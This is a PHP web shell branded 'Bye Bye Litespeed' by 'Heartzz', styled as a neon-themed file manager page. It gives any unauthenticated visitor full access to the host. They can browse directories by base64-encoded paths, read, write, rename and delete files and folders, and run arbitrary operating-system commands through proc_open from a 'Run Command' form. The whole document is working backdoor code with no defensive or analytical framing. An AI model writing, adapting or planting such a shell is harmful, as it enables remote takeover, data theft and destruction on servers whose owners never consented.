<!DOCTYPE html>
<html>
<head>
    <title></title>
    <link href="https://fonts.googleapis.com/css?family=Protest Revolution" rel="stylesheet">
    <style>
        body {
             font-family: 'Protest Revolution';
             color: red;
             margin: 0;
             padding: 0;
             text-shadow: 2px 2px 4px rgba(255, 0, 0, 0.5);
             background-image: url('https://iphoneswallpapers.com/wp-content/uploads/2022/09/iPhone-13-RGB-Neon-Frame.jpg');
             background-size: cover;
             background-position: center;
}
        .container {
            width: 90%;
            margin: 20px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .result-box {
            width: 97.5%;
            height: 200px;
            resize: none;
            overflow: auto;
            font-family: 'Protest Revolution';
            background-color: #f4f4f4;
            padding: 10px;
            border: 1px solid #ddd;
            margin-bottom: 10px;
        }
        hr {
            border: 0;
            border-top: 1px solid #ddd;
            margin: 20px 0;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
        tr:nth-child(even) {
            background-color: #f9f9f9;
        }
        tr:hover {
            background-color: #f2f2f2;
        }
        input[type="text"], input[type="submit"], textarea[name="file_content"] {
            width: calc(97.5% - 10px);
            margin-bottom: 10px;
            padding: 8px;
            max-height: 200px;
            resize: vertical;
            border: 1px solid #ddd;
            border-radius: 3px;
            font-family: 'Protest Revolution';
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            font-family: 'Protest Revolution';
            border: none;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        .item-name {
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        td.size {
    width: 100px;
}

        .writable {
            color: green;
        }
        .not-writable {
            color: red;
        }
        .permission {
        font-weight: bold;
        width: 50px;
        height: 20px;
        text-align: center;
        line-height: 20px;
        overflow: hidden;
    }
    
    </style>
</head>
<body>
<div class="container">
<?php
$rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);

function x($b)
{
    return base64_encode($b);
}

function y($b)
{
    return base64_decode($b);
}

foreach ($_GET as $c => $d) $_GET[$c] = y($d);

$currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
chdir($currentDirectory);

$viewCommandResult = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
        $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
        if (!file_exists($newFolder)) {
            mkdir($newFolder);
            echo '<hr>Folder created successfully!';
        } else {
            echo '<hr>Error: Folder already exists!';
        }
    } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
        $fileName = $_POST['file_name'];
        $newFile = $currentDirectory . '/' . $fileName;
        if (!file_exists($newFile)) {
            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                echo '<hr>File created successfully!';
            } else {
                echo '<hr>Error: Failed to create file!';
            }
        } else {
            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                echo '<hr>File edited successfully!';
            } else {
                echo '<hr>Error: Failed to edit file!';
            }
        }
    } elseif (isset($_POST['delete_file'])) {
        $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
        if (file_exists($fileToDelete)) {
            if (unlink($fileToDelete)) {
                echo '<hr>File deleted successfully!';
            } else {
                echo '<hr>Error: Failed to delete file!';
            }
        } elseif (is_dir($fileToDelete)) {
            if (deleteDirectory($fileToDelete)) {
                echo '<hr>Folder deleted successfully!';
            } else {
                echo '<hr>Error: Failed to delete folder!';
            }
        } else {
            echo '<hr>Error: File or directory not found!';
        }
    } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
        $oldName = $currentDirectory . '/' . $_POST['old_name'];
        $newName = $currentDirectory . '/' . $_POST['new_name'];
        if (file_exists($oldName)) {
            if (rename($oldName, $newName)) {
                echo '<hr>Item renamed successfully!';
            } else {
                echo '<hr>Error: Failed to rename item!';
            }
        } else {
            echo '<hr>Error: Item not found!';
        }
    } elseif (isset($_POST['cmd_input'])) {
        $command = $_POST['cmd_input'];
        $descriptorspec = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = proc_open($command, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            $errors = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            if (!empty($errors)) {
                $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . htmlspecialchars($errors) . '</textarea>';
            } else {
                $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . htmlspecialchars($output) . '</textarea>';
            }
        } else {
            $viewCommandResult = '<hr><p>Error: Failed to execute command!</p>';
        }
    } elseif (isset($_POST['view_file'])) {
$fileToView = $currentDirectory . '/' . $_POST['view_file'];
if (file_exists($fileToView)) {
$fileContent = file_get_contents($fileToView);
$viewCommandResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p><textarea class="result-box">' . htmlspecialchars($fileContent) . '</textarea>';
} else {
$viewCommandResult = '<hr><p>Error: File not found!</p>';
}
}
}
echo '<center>

<div class="fig-ansi">
<pre id="taag_font_ANSIShadow" class="fig-ansi"><span style="color: #4CAF50;">   <strong>  __    Bye Bye Litespeed   _____ __    
    __|  |___ ___ ___ ___ ___   |   __|  | v.1.2
|  |  | .\'| . | . | .\'|   |  |__   |  |__ 
|_____|__,|_  |___|__,|_|_|  |_____|_____|
                |___| ./Heartzz                      </strong> </span></pre>
</div>
</center>';
echo '<hr>curdir: ';
$directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
$currentPath = '';
foreach ($directories as $index => $dir) {
    if ($index == 0) {
        echo '<a href="?d=' . x($dir) . '">' . $dir . '</a>';
    } else {
        $currentPath .= DIRECTORY_SEPARATOR . $dir;
        echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
    }
}
echo '<br>';
echo '<hr><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
echo '<input type="text" name="folder_name" placeholder="New Folder Name">';
echo '<input type="submit" value="Create Folder">';
echo '</form>';

echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
echo '<input type="text" name="file_name" placeholder="Create New File / Edit Existing File">';
echo '<textarea name="file_content" placeholder="File Content (for new file) or Edit Content (for existing file)"></textarea>';
echo '<input type="submit" value="Create / Edit File">';
echo '</form>';

echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="text" name="cmd_input" placeholder="Enter command"><input type="submit" value="Run Command"></form>';
echo $viewCommandResult;
echo '<div>';
echo '</div>';
echo '<table border=1>';
echo '<br><tr><th><center>Item Name</th><th><center>Size</th><th><center> View  </th><th><center>Delete </th><th>Permissions</th><th><center>Rename</th></tr></center></center></center>';
foreach (scandir($currentDirectory) as $v) {
    $u = realpath($v);
    $s = stat($u);
    $itemLink = is_dir($v) ? '?d=' . x($currentDirectory . '/' . $v) : '?'.('d='.x($currentDirectory).'&f='.x($v));
    $permission = substr(sprintf('%o', fileperms($v)), -4);
    $writable = is_writable($v);
    echo '<tr>
            <td class="item-name"><a href="'.$itemLink.'">'.$v.'</a></td>
            <td class="size">'.filesize($u).'</td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="view_file" value="'.htmlspecialchars($v).'"><input type="submit" value="View"></form></td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="delete_file" value="'.htmlspecialchars($v).'"><input type="submit" value="Delete"></form></td>
            <td class="permission '.($writable ? 'writable' : 'not-writable').'">'.$permission.'</td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="old_name" value="'.htmlspecialchars($v).'"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
        </tr>';
}

echo '</table>';
function deleteDirectory($dir) {
if (!file_exists($dir)) {
return true;
}
if (!is_dir($dir)) {
return unlink($dir);
}
foreach (scandir($dir) as $item) {
if ($item == '.' || $item == '..') {
continue;
}
if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
return false;
}
}
return rmdir($dir);
}
?>

</div>
</body>
</html>